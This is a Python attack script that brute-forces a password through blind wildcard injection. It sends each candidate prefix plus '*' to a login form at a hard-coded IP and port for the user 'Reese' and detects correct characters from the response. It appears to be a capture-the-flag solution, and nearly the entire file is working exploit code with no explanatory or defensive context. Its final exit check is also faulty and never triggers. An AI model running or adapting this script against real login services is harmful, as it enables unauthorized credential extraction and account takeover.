import requests
from time import *
import sys


ip = "http://206.189.121.131:30576"
directory = "/login"

letters = [ '!', '"', '#', '$', '%', '&', '\'', '(', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', \
'9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', \
'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', \
'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~']

username = "Reese"
passwd = ""

i=0

while i < len(letters):
	print("\r[+] Trying out password : " + passwd + letters[i], end="")
	data = {
		"username" : username,
		"password" : passwd + letters[i] + '*'
	}
	
	
	# Sending request with password
	response = requests.post(ip + directory, data=data)
	if "Reese" not in response.text:
		passwd += letters[i]
		i=0
		continue
	# Exit case
	if i == len(letters):
		print(f"\r Potential Password : {passwd}", end="")
		sys.exit(0)
	i = i + 1